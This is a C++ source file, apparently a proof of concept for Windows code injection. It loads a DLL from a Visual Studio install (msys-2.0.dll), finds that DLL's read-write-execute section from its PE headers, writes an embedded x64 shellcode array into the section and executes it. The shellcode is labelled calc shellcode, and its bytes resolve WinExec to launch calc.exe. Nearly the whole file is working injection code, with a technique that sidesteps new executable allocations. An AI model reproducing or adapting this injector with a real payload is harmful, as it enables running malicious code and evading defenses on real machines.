#include <iostream>
#include <Windows.h>
#include <Psapi.h>
#include <dbghelp.h>
#include <vector>

// Calc shellcode
std::vector<uint8_t> Shellcode = {
    0x55, 0x48, 0x89, 0xE5, 0x48, 0x81, 0xEC, 0x90, 0x00, 0x00, 0x00, 0x48, 0x31, 0xC0, 0x65, 0x48, 0x8B, 0x04, 0x25, 0x30, 0x00, 0x00, 0x00, 0x48, 0x8B,
    0x40, 0x60, 0x48, 0x8B, 0x40, 0x18, 0x48, 0x8B, 0x40, 0x20, 0x48, 0x8B, 0x00, 0x48, 0x8B, 0x00, 0x48, 0x8D, 0x40, 0xF0, 0x48, 0x8B, 0x40, 0x30, 0x48,
    0x31, 0xDB, 0x8B, 0x58, 0x3C, 0x48, 0x01, 0xC3, 0x48, 0x81, 0xC3, 0x88, 0x00, 0x00, 0x00, 0x48, 0x31, 0xC9, 0x8B, 0x0B, 0x48, 0x01, 0xC1, 0x48, 0x89,
    0x8D, 0x70, 0xFF, 0xFF, 0xFF, 0x48, 0x31, 0xD2, 0x8B, 0x51, 0x1C, 0x48, 0x01, 0xC2, 0x48, 0x89, 0x55, 0x90, 0x48, 0x31, 0xDB, 0x8B, 0x51, 0x20, 0x48,
    0x01, 0xC2, 0x48, 0x89, 0x55, 0xA0, 0x48, 0x31, 0xC9, 0x48, 0x31, 0xD2, 0x51, 0x48, 0xB9, 0xFF, 0x57, 0x69, 0x6E, 0x45, 0x78, 0x65, 0x63, 0x48, 0xC1,
    0xE9, 0x08, 0x51, 0x54, 0x48, 0x31, 0xC9, 0xB1, 0x07, 0x51, 0x41, 0x58, 0x41, 0x59, 0x4D, 0x31, 0xE4, 0x4C, 0x89, 0xC1, 0x4C, 0x89, 0xCE, 0x48, 0x8B,
    0x55, 0xA0, 0x42, 0x8B, 0x14, 0xA2, 0x49, 0xFF, 0xC4, 0x4C, 0x8D, 0x1C, 0x02, 0x4C, 0x89, 0xDF, 0xF3, 0xA6, 0x75, 0xE4, 0x48, 0x83, 0xC4, 0x10, 0x49,
    0xFF, 0xCC, 0x48, 0x31, 0xFF, 0x48, 0x31, 0xD2, 0xB2, 0x04, 0x48, 0x01, 0xD7, 0x50, 0x48, 0x89, 0xF8, 0x4C, 0x89, 0xE6, 0x48, 0xF7, 0xEE, 0x48, 0x89,
    0xC6, 0x58, 0x48, 0x8B, 0x7D, 0x90, 0x48, 0x8D, 0x3C, 0x37, 0x8B, 0x3F, 0x48, 0x01, 0xC7, 0x48, 0xBB, 0x41, 0x41, 0x41, 0x41, 0x2E, 0x65, 0x78, 0x65,
    0x48, 0xC1, 0xEB, 0x20, 0x53, 0x48, 0xBB, 0x6D, 0x33, 0x32, 0x5C, 0x63, 0x61, 0x6C, 0x63, 0x53, 0x48, 0xBB, 0x77, 0x73, 0x5C, 0x73, 0x79, 0x73, 0x74,
    0x65, 0x53, 0x48, 0xBB, 0x43, 0x3A, 0x5C, 0x57, 0x69, 0x6E, 0x64, 0x6F, 0x53, 0x54, 0x59, 0x48, 0xFF, 0xC2, 0x48, 0x83, 0xEC, 0x20, 0xFF, 0xD7
};


struct SectionDescriptor {
    LPVOID start;
    LPVOID end;
};

// Function to find offset of RWX section in given DLL
DWORD_PTR FindRWXOffset(HMODULE hModule) {
    IMAGE_NT_HEADERS* ntHeader = ImageNtHeader(hModule);
    if (ntHeader != NULL) {
        IMAGE_SECTION_HEADER* sectionHeader = IMAGE_FIRST_SECTION(ntHeader);
        for (WORD i = 0; i < ntHeader->FileHeader.NumberOfSections; i++) {
            if ((sectionHeader->Characteristics & IMAGE_SCN_MEM_EXECUTE) && (sectionHeader->Characteristics & IMAGE_SCN_MEM_WRITE) && (sectionHeader->Characteristics & IMAGE_SCN_MEM_READ)) {
                DWORD_PTR baseAddress = (DWORD_PTR)hModule;
                DWORD_PTR sectionOffset = sectionHeader->VirtualAddress;
                DWORD_PTR sectionSize = sectionHeader->SizeOfRawData;
                std::cout << "Base Adress : " << std::hex << baseAddress << std::endl;
                std::cout << "Section Offset : " << std::hex << sectionOffset << std::endl;
                std::cout << "Size of RWX section : " << sectionSize << std::endl;
                return sectionOffset;
            }
            sectionHeader++;
        }
    }
    return 0;
}

// Function to find size of RWX section in given DLL
DWORD_PTR FindRWXSize(HMODULE hModule) {
    IMAGE_NT_HEADERS* ntHeader = ImageNtHeader(hModule);
    if (ntHeader != NULL) {
        IMAGE_SECTION_HEADER* sectionHeader = IMAGE_FIRST_SECTION(ntHeader);
        for (WORD i = 0; i < ntHeader->FileHeader.NumberOfSections; i++) {
            if ((sectionHeader->Characteristics & IMAGE_SCN_MEM_EXECUTE) && (sectionHeader->Characteristics & IMAGE_SCN_MEM_WRITE) && (sectionHeader->Characteristics & IMAGE_SCN_MEM_READ)) {
                DWORD_PTR sectionSize = sectionHeader->SizeOfRawData;
                std::cout << "Size of RWX section : " << sectionSize << std::endl;
                return sectionSize;
            }
            sectionHeader++;
        }
    }
    return 0;
}

// Function to write Shellcode to RWX section of DLL
void WriteCodeToSection(LPVOID rwxSectionAddr, const std::vector<uint8_t>& shellcode) {
    std::copy(shellcode.begin(), shellcode.end(), static_cast<uint8_t*>(rwxSectionAddr));
    std::cout << shellcode.size() << " bytes of Sh3llc0d3 written to RWX Memory Region\n";
}

// Function to execute Shellcode from RWX section of DLL
void ExecuteCodeFromSection(LPVOID rwxSectionAddr) {
    // Define a function pointer to the shellcode
    using ShellcodeFunction = void(*)();
    ShellcodeFunction shellcodeFunction = reinterpret_cast<ShellcodeFunction>(rwxSectionAddr);

    // Call the shellcode function
    shellcodeFunction();
    std::cout << "Execution of Sh3llc0d3 from RWX Memory Region\n";
}

int main()
{
    std::cout << "Main function execution...\n";
    // Load the hardcoded vulnerable DLL
    HMODULE hDll = ::LoadLibraryW(L"C:\\Program Files\\Microsoft Visual Studio\\2022\\Community\\Common7\\IDE\\CommonExtensions\\Microsoft\\TeamFoundation\\Team Explorer\\Git\\usr\\bin\\msys-2.0.dll");

    if (hDll == nullptr) {
        // Failed to load the DLL
        std::cout << "[!] Failed to load the targeted DLL\n";
        return 1;
    }

    MODULEINFO moduleInfo;
    if (!::GetModuleInformation(::GetCurrentProcess(),hDll,&moduleInfo,sizeof(MODULEINFO))) {
        // Failed to get the module info
        std::cout << "[!] Failed to get module info\n";
        return 1;
    }

    // Find the offset and size of RWX section in the DLL
    DWORD_PTR RWX_SECTION_OFFSET = FindRWXOffset(hDll);
    DWORD_PTR RWX_SECTION_SIZE = FindRWXSize(hDll);


    // Access the default RWX section (Vulnerable DLL address + offset)
    LPVOID rwxSectionAddr = reinterpret_cast<LPVOID>(reinterpret_cast<PBYTE>(moduleInfo.lpBaseOfDll) + RWX_SECTION_OFFSET);
    std::cout << "Address of RWX Section : " << rwxSectionAddr << std::endl;

    SectionDescriptor descriptor = SectionDescriptor{
        rwxSectionAddr, reinterpret_cast<LPVOID>(reinterpret_cast<PBYTE>(rwxSectionAddr) + RWX_SECTION_SIZE)
    };
    std::cout << "RWX section starts at " << descriptor.start << " and ends at " << descriptor.end << std::endl;

    // Write the injected code to the RWX section
    WriteCodeToSection(rwxSectionAddr, Shellcode);

    // Execute the injected code
    ExecuteCodeFromSection(rwxSectionAddr);

    return 0;
}
